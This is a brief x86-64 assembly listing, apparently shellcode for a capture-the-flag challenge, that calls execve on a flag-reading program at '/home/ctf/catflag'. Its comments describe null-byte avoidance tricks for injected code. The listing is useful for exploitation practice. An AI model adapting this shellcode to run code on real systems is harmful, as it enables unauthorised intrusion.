.global _start
_start:
.intel_syntax noprefix

	mov al, 59            
	mov rdi, 0x1337016
    xor bl, bl
    mov BYTE PTR[rdi+0x12], bl # add a null byte after our string
	xor rsi, rsi             
	xor rdx, rdx             
	syscall
binsh:                     
	.ascii "/home/ctf/catflag"  # use .ascii to leave out trailing null byte
